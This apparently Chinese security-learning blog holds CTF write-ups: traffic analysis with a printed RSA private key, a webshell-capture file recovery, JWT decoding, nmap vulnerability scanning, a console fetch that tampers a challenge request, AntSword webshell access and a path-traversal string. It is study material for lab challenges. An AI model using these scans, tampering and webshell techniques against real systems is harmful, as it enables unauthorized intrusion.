<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ</span><br><span class="line">LsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO</span><br><span class="line">vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB</span><br><span class="line">AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4</span><br><span class="line">QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/</span><br><span class="line">QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN</span><br><span class="line">czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ</span><br><span class="line">ZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9</span><br><span class="line">kzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN</span><br><span class="line">+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1</span><br><span class="line">AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH</span><br><span class="line">/5pfc3AmEyRdfyx6zwUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH</span><br><span class="line">2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>将key.txt导入</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/4.4.png" alt="1"></p>
<p>发现多出现了几条http的包</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/4.5.png" alt="1"></p>
<p>追踪一下http流就可以得到最终信息了</p>
<h2 id="buuctf-秘密文件"><a href="#buuctf-秘密文件" class="headerlink" title="buuctf 秘密文件"></a>buuctf 秘密文件</h2><p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/2.1.png" alt="1"></p>
<p>搜素flag。</p>
<p>在FTP选择最总TCP流。</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/2.2.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/2.3.png" alt="1"></p>
<p>发现RAR，binwalk提取一下，爆破密码。</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/2.4.png" alt="1"></p>
<p>解压即可得到flag。</p>
<h2 id="菜刀666"><a href="#菜刀666" class="headerlink" title="菜刀666"></a>菜刀666</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method==POST</span><br></pre></td></tr></table></figure>

<p>过滤出http post的数据包</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/3.1.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/3.2.png" alt="1"></p>
<p>发现可疑的文件,继续看。</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/3.3.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/3.4.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RDpcd2FtcDY0XHd3d1x1cGxvYWRcNjY2Ni5qcGc  base64 --&gt;D:\wamp64\www\upload\6666.jpg</span><br></pre></td></tr></table></figure>

<p>紧接着是FF D8发现是JPG的开头复制到010里面保存。</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/666.jpg" alt="1"></p>
<p>找到密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Th1s_1s_p4sswd_!!!</span><br></pre></td></tr></table></figure>

<p>继续往下看</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/3.5.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/3.6.png" alt="1"></p>
<p>发现zip头</p>
<p>提取放到010保存到zip,用密码解压即可得到flag</p>
<h2 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h2><p>问一:</p>
<p>该网站使用了______认证方式</p>
<p>http contains “login”过滤先追踪http流</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/jwt1.1.png" alt="1"></p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/jwt1.2.png" alt="1"></p>
<p>可以看到是jwt</p>
<p>问2：</p>
<p>id和username是______</p>
<p>先http contains “whoami”过滤，whoami(查看当前系统用户的命令)的流量包。</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/jwt2.1.png" alt="1"></p>
<p>追踪命令成功的http流，过滤把tokenbase64解密</p>
<p><img src="/2025/07/29/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/jwt2.2.png" alt="1"></p>
<p>id : 10087 username:admin</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">渗透学习</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-07-29 10:30:15" itemprop="dateCreated datePublished" datetime="2025-07-29T10:30:15+08:00">2025-07-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 22:32:32" itemprop="dateModified" datetime="2025-09-23T22:32:32+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">渗透学习</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="渗透之路"><a href="#渗透之路" class="headerlink" title="渗透之路"></a>渗透之路</h1><p>身为一个网安生我感觉渗透应该是必学的，所以从现在开始我开始我的渗透之路了。</p>
<h2 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a>计算机基础</h2><h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><h4 id="linux命令"><a href="#linux命令" class="headerlink" title="linux命令"></a>linux命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">ls                                                           //列出当前目录中的文件和子目录</span><br><span class="line">pwd                                                          //显示当前工作目录的路径</span><br><span class="line">cd /path/to/directory                                        //切换工作目录</span><br><span class="line">mkdir directory_name                                         //创建新目录</span><br><span class="line">rmdir directory_name                                         //删除空目录</span><br><span class="line">rm file_name                                                 //删除文件或目录</span><br><span class="line">rm -r directory_name                                         //递归删除目录及其内容</span><br><span class="line">cp source_file destination                                   //复制文件或目录</span><br><span class="line">cp -r source_directory destination                           //递归复制目录及其内容</span><br><span class="line">mv old_name new_name                                         //移动或重命名文件或目录</span><br><span class="line">touch file_name                                              //创建空文件或更新文件的时间戳</span><br><span class="line">cat file_name                                                //连接和显示文件内容</span><br><span class="line">more/less                                                    //逐页显示文本文件内容</span><br><span class="line">head/tail(head -n 10 file_name  # 显示文件的前10行)           //显示文件的前几行或后几行</span><br><span class="line">grep search_term file_name                                   //在文件中搜索指定文本</span><br><span class="line">ps aux                                                       //显示当前运行的进程</span><br><span class="line">kill process_id                                              //终止进程</span><br><span class="line">ifconfig/ip(ip addr show)                                    //查看和配置网络接口信息</span><br><span class="line">ping host_name_or_ip                                         //测试与主机的连通性</span><br><span class="line">wget/curl(wget URL/curl -O URL)                              //从网络下载文件</span><br><span class="line">chown owner:group file_name                                  //修改文件或目录的所有者</span><br><span class="line">tar -czvf archive.tar.gz directory_name                      //压缩目录</span><br><span class="line">tar -xzvf archive.tar.gz                                     //解压文件</span><br><span class="line">df -h                                                        //显示磁盘空间使用情</span><br><span class="line">du -h directory_name                                         //显示目录的磁盘使用情况</span><br><span class="line">mount /dev/sdX1 /mnt                                         //挂载分区到指定目录</span><br><span class="line">umount /mnt                                                  //卸载挂载的文件系统</span><br><span class="line">psql -U username -d database_name                            //连接到PostgreSQL数据库</span><br><span class="line">mysql -u username -p                                         //连接到MySQL数据库</span><br><span class="line">top/htop                                                     //显示系统资源的实时使用情况和进程信息</span><br><span class="line">ssh username@remote_host                                     //远程登录到其他计算机</span><br><span class="line">scp local_file remote_user@remote_host:/remote/directory     //安全地将文件从本地复制到远程主机，或从远程主机复制到本地</span><br><span class="line">find /path/to/search -name &quot;file_pattern&quot;                    //在文件系统中查找文件和目录</span><br><span class="line">grep -r &quot;pattern&quot; /path/to/search                            //在文本中搜索匹配的行，并可以使用正则表达式进行高级搜索</span><br><span class="line">sed &#x27;s/old_text/new_text/&#x27; file_name                         //流编辑器，用于文本处理和替换</span><br><span class="line">awk &#x27;&#123;print $1&#125;&#x27; file_name                                   //提取文件中的第一列数据</span><br><span class="line">ssh-keygen -t rsa                                            //生成SSH密钥对，用于身份验证远程服务器</span><br><span class="line">date                                                         //显示或设置系统日期和时间</span><br><span class="line">echo                                                         //将文本输出到标准输出</span><br><span class="line">ln source_file link_name                                     //创建硬链接</span><br><span class="line">ln -s source_file link_name                                  //创建符号链接</span><br><span class="line">uname -a                                                     //显示系统信息</span><br><span class="line">shutdown/reboot                                              //关闭或重新启动系统</span><br><span class="line">who/w                                                        //显示当前登录的用户信息</span><br><span class="line">curl -X GET http://exampe.com                                //用于与网络资源进行交互，支持各种协议</span><br><span class="line">zip archive.zip file1 file2                                  //压缩文件</span><br><span class="line">unzip archive.zip                                            //解压ZIP文件</span><br><span class="line">chmod permissions file_name                                  //修改文件权限</span><br><span class="line">chown owner:group file_name                                  //修改文件所有者</span><br><span class="line">useradd new_user                                             //添加用户</span><br><span class="line">userdel username                                             //删除用户</span><br><span class="line">passwd                                                       //更改用户密码</span><br><span class="line">crontab -e                                                   //编辑用户的定时任务</span><br><span class="line">uptime                                                       //显示系统的运行时间和负载情况</span><br><span class="line">hostname                                                     //显示或设置计算机的主机名</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT                //允许HTTP流量(用于配置防火墙规则)</span><br><span class="line">ufw enable                                                   //启用Uncomplicated Firewall(用于配置防火墙规则)</span><br><span class="line">netstat -tuln                                                //显示所有TCP和UDP端口</span><br><span class="line">ss -tuln                                                     //使用Socket Stat查看网络连接</span><br><span class="line">ps aux                                                       //显示所有进程</span><br><span class="line">top                                                          //实时监视系统资源</span><br><span class="line">htop                                                         //更友好的进程监视器</span><br><span class="line">history                                                      //查看命令历史记录</span><br><span class="line">free -m                                                      //以MB为单位显示内存使用情况</span><br><span class="line">lsblk                                                        //显示块设备信息</span><br><span class="line">fdisk /dev/sdX                                               //打开磁盘分区工具</span><br><span class="line">nc -vz host_name_or_ip port                                  //测试主机的端口是否可达</span><br><span class="line">stat file_or_directory                                       //显示文件或目录的详细信息</span><br><span class="line">nmcli connection show                                        //显示网络连接信息</span><br><span class="line">tailf file_name                                              //实时追踪文件的末尾，类似于tail -f</span><br><span class="line">scp local_file remote_user@remote_host:/remote/directory     //从本地到远程</span><br><span class="line">scp remote_user@remote_host:/remote/file local_directory     //从远程到本地</span><br><span class="line">rsync                                                        //用于在本地和远程系统之间同步文件和目录</span><br><span class="line">例：rsync -avz source_directory/ remote_user@remote_host:/remote/directory/</span><br><span class="line">dd if=input_file of=output_file bs=block_size                //用于复制和转换文件</span><br><span class="line">sudo                                                         //以超级用户权限运行命令</span><br></pre></td></tr></table></figure>



<h4 id="kali-linux进行渗透测试"><a href="#kali-linux进行渗透测试" class="headerlink" title="kali linux进行渗透测试"></a>kali linux进行渗透测试</h4><h5 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h5><h6 id="信息收集（Reconnaissance）"><a href="#信息收集（Reconnaissance）" class="headerlink" title="信息收集（Reconnaissance）"></a>信息收集（Reconnaissance）</h6><p>使用Whois查询域名信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois example.com</span><br></pre></td></tr></table></figure>

<p>WHOIS 查询能获取哪些信息:</p>
<p>查询返回的信息会因顶级域名和注册商的不同而有所差异，但通常包含以下内容：</p>
<ol>
<li><strong>域名状态：</strong> 如 <code>ok</code> (正常), <code>clientHold</code> (注册商暂停解析), <code>serverHold</code> (注册局暂停解析), <code>pendingDelete</code> (等待删除) 等。这反映了域名的当前管理状态。</li>
<li><strong>注册人信息：</strong><ul>
<li>注册人姓名&#x2F;组织名称。</li>
<li>注册人联系地址。</li>
<li>注册人联系电话。</li>
<li>注册人联系邮箱。</li>
<li><strong>(重要变化)</strong> 由于隐私法规（如 GDPR），现在公开显示的注册人信息通常是<strong>注册商提供的隐私保护服务</strong>的联系信息，而不是真实的注册人信息。</li>
</ul>
</li>
<li><strong>管理联系人信息：</strong> 负责管理域名事宜的联系人信息（同样常受隐私保护）。</li>
<li><strong>技术联系人信息：</strong> 负责处理域名技术问题（如 DNS）的联系人信息（同样常受隐私保护）。</li>
<li><strong>注册商信息：</strong><ul>
<li>注册商名称。</li>
<li>注册商官方网站。</li>
<li>注册商 WHOIS 服务器地址。</li>
<li>注册商提供的支持联系方式。</li>
</ul>
</li>
<li><strong>重要日期：</strong><ul>
<li><strong>创建日期：</strong> 域名首次注册的日期。</li>
<li><strong>到期日期：</strong> 域名注册的有效截止日期。在此日期后未续费，域名可能会被删除并重新开放注册。</li>
<li><strong>更新日期：</strong> 域名信息（如联系信息或 DNS 设置）最后一次更新的日期。</li>
</ul>
</li>
<li><strong>域名服务器：</strong><ul>
<li>主域名服务器地址。</li>
<li>辅域名服务器地址。这些服务器存储了该域名对应的 DNS 记录（如 A, MX, CNAME 记录）。</li>
</ul>
</li>
<li><strong>授权服务器：</strong> 有时会列出提供该域名权威 WHOIS 数据的服务器地址。</li>
</ol>
<p>使用Dig进行DNS查询</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig [@server] [options] [name] [type]</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><code>[@server]</code> (可选):</strong> 指定要查询的 DNS 服务器的 IP 地址或主机名。如果省略，则使用系统 <code>/etc/resolv.conf</code> 文件中配置的 DNS 服务器。<ul>
<li>示例：<code>dig @8.8.8.8 example.com</code></li>
</ul>
</li>
<li><strong><code>[options]</code> (可选):</strong> 控制 <code>dig</code> 行为和输出的各种选项，以 <code>+</code> 开头。<ul>
<li>常用选项：<ul>
<li><code>+short</code>: 只显示最精简的答案（通常是 IP 地址或目标域名）。</li>
<li><code>+noall</code>: 关闭所有输出部分（通常与 <code>+answer</code> 等组合使用）。</li>
<li><code>+answer</code>: <strong>只显示答案部分</strong> (最常用！)。</li>
<li><code>+stats</code>: 显示查询统计信息（耗时、大小等）。</li>
<li><code>+trace</code>: 模拟 DNS 递归解析的完整过程，从根域名服务器开始追踪。</li>
<li><code>+nocmd</code>: 不显示最初的命令和版本信息行。</li>
<li><code>+nocomments</code>: 不显示注释行。</li>
<li><code>+tcp</code>: 强制使用 TCP 协议进行查询（默认使用 UDP，在响应过大或需要区域传输时 TCP 是必需的）。</li>
<li><code>-x</code>: 进行反向 DNS 查询（根据 IP 查找域名），此时 <code>[name]</code> 应为 IP 地址，<code>[type]</code> 通常省略或为 <code>PTR</code>。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>[name]</code> (通常需要):</strong> 要查询的域名（如 <code>example.com</code>, <code>www.google.com</code>) 或 IP 地址（当使用 <code>-x</code> 时）。</li>
<li><strong><code>[type]</code> (可选):</strong> 指定要查询的 DNS 记录类型。如果省略，默认为查询 <code>A</code> 记录。常见类型：<code>A</code>, <code>AAAA</code>, <code>MX</code>, <code>CNAME</code>, <code>NS</code>, <code>TXT</code>, <code>SOA</code>, <code>PTR</code>, <code>ANY</code>（查询所有记录，但通常被服务器限制或拒绝）。<ul>
<li>示例：<code>dig example.com MX</code>, <code>dig example.com NS</code></li>
</ul>
</li>
</ul>
<p><code>dig</code> 是 DNS 领域无可争议的瑞士军刀。它通过提供<strong>详细、可控、原始</strong>的 DNS 查询响应，使你能够：</p>
<ul>
<li>精确查询<strong>任何类型</strong>的 DNS 记录。</li>
<li>指定向<strong>任何 DNS 服务器</strong>发送查询。</li>
<li><strong>深入诊断</strong>各种 DNS 解析问题。</li>
<li><strong>验证</strong> DNS 配置更改。</li>
<li><strong>理解</strong> DNS 协议交互的底层细节。</li>
</ul>
<p>Nmap的使用</p>
<h3 id="核心功能"><a href="#核心功能" class="headerlink" title="核心功能"></a><strong>核心功能</strong></h3><ol>
<li><strong>端口扫描</strong><ul>
<li><code>-sS</code>：TCP SYN 扫描（默认，需 root）</li>
<li><code>-sT</code>：TCP 全连接扫描（无需 root）</li>
<li><code>-sU</code>：UDP 扫描（需 sudo）</li>
<li><code>-p</code>：指定端口（<code>-p 80,443</code> 或 <code>-p-</code> 全端口）</li>
</ul>
</li>
<li><strong>服务识别</strong><ul>
<li><code>-sV</code>：探测服务版本</li>
</ul>
</li>
<li><strong>操作系统探测</strong><ul>
<li><code>-O</code>：猜测目标 OS</li>
</ul>
</li>
<li><strong>主机发现</strong><ul>
<li><code>-sn</code>：Ping 扫描（不扫端口）</li>
</ul>
</li>
<li><strong>脚本引擎（NSE）</strong><ul>
<li><code>--script=&lt;脚本&gt;</code>：如 <code>vuln</code>（漏洞检测）、<code>http-title</code>（网页标题</li>
</ul>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 基础扫描：SYN + 服务版本</span><br><span class="line">sudo nmap -sS -sV target_ip</span><br><span class="line"></span><br><span class="line"># 快速扫描：仅常用端口</span><br><span class="line">nmap -F target_ip</span><br><span class="line"></span><br><span class="line"># 全端口扫描 + OS 探测</span><br><span class="line">sudo nmap -p- -O target_ip</span><br><span class="line"></span><br><span class="line"># UDP 关键端口扫描</span><br><span class="line">sudo nmap -sU -p 53,67,161 target_ip</span><br><span class="line"></span><br><span class="line"># 漏洞检测（NSE）</span><br><span class="line">sudo nmap --script=vuln target_ip</span><br></pre></td></tr></table></figure>

<p>感觉这样只学理论感觉不太行，以后的边练边学。</p>
<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p>moectf2025</p>
<h3 id="第一章-神秘的手镯"><a href="#第一章-神秘的手镯" class="headerlink" title="第一章 神秘的手镯"></a>第一章 神秘的手镯</h3><p>F12在源码中找到flag</p>
<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E7%BB%83%E4%B9%A01.png" alt="1"></p>
<h3 id="第三章-问剑石！篡天改命！"><a href="#第三章-问剑石！篡天改命！" class="headerlink" title="第三章 问剑石！篡天改命！"></a>第三章 问剑石！篡天改命！</h3><p>F12查看源码看到flag的逻辑</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">testTalent</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/test_talent?level=B&#x27;</span>, &#123;</span><br><span class="line">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                <span class="attr">headers</span>: &#123;</span><br><span class="line">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">manifestation</span>: <span class="string">&#x27;none&#x27;</span> &#125;)</span><br><span class="line">            &#125;);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">const</span> data = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;result&#x27;</span>).<span class="property">textContent</span> = data.<span class="property">result</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 显示/隐藏光芒效果</span></span><br><span class="line">            <span class="keyword">const</span> glow = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;glow&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> (data.<span class="property">result</span>.<span class="title function_">includes</span>(<span class="string">&#x27;流云状青芒&#x27;</span>)) &#123;</span><br><span class="line">                glow.<span class="property">style</span>.<span class="property">opacity</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                glow.<span class="property">style</span>.<span class="property">opacity</span> = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (data.<span class="property">flag</span>) &#123;</span><br><span class="line">                <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                    <span class="title function_">alert</span>(<span class="string">`✨ 天道机缘：<span class="subst">$&#123;data.flag&#125;</span> ✨\n\n天赋篡天术大成！`</span>);</span><br><span class="line">                &#125;, <span class="number">500</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&#x27;玄轨连接中断！请检查灵枢...&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以通过在控制台发送信息来得到flag</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/test_talent?level=S&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; <span class="attr">manifestation</span>: <span class="string">&#x27;flowing_azure_clouds&#x27;</span> &#125;)</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;篡改成功！Flag为：&quot;</span>, data.<span class="property">flag</span>);</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">`✨ 天道机缘：<span class="subst">$&#123;data.flag&#125;</span> ✨`</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;篡天失败：&quot;</span>, err));</span><br></pre></td></tr></table></figure>

<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E7%BB%83%E4%B9%A03.png" alt="1"></p>
<h3 id="第十二章-玉魄玄关·破妄"><a href="#第十二章-玉魄玄关·破妄" class="headerlink" title="第十二章 玉魄玄关·破妄"></a>第十二章 玉魄玄关·破妄</h3><p>用蚁剑，先右键添加数据，输入ip和端口，测试链接，再点击添加就成功了，密码是cmd</p>
<p><img src="/2025/07/29/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/%E7%BB%83%E4%B9%A012.1.png" alt="1"></p>
<p>flag应该就藏在某个文件夹里面，反正我没找到，以后再看看。找到了在环境变量里面。</p>
<h3 id="第五章-打上门来！"><a href="#第五章-打上门来！" class="headerlink" title="第五章 打上门来！"></a>第五章 打上门来！</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../</span><br></pre></td></tr></table></figure>

<p>..&#x2F;可以返回上级目录</p>
